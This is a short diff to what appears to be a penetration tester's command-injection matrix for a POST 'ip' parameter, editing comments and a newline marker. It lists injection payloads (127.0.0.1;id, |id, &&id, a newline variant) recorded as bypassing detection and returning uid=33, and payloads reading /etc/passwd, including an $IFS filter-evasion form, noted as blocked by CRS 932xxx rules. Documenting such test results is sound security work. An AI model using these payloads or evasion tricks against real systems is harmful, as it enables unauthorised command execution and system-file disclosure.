@@ -1,9 +1,10 @@
 # Phase 5 - command injection matrix (POST ip=...)
-# --- bypassed (200 + uid=33, no detection rule) ---
+# Marker: <NL> = newline character
+# --- bypassed at the time (200 + uid=33, no detection rule) ---
 127.0.0.1;id
 127.0.0.1|id
 127.0.0.1&&id
-127.0.0.1<newline>id
+127.0.0.1<NL>id
 # --- blocked by CRS 932xxx ---
 127.0.0.1;cat /etc/passwd
 127.0.0.1;cat$IFS/etc/passwd
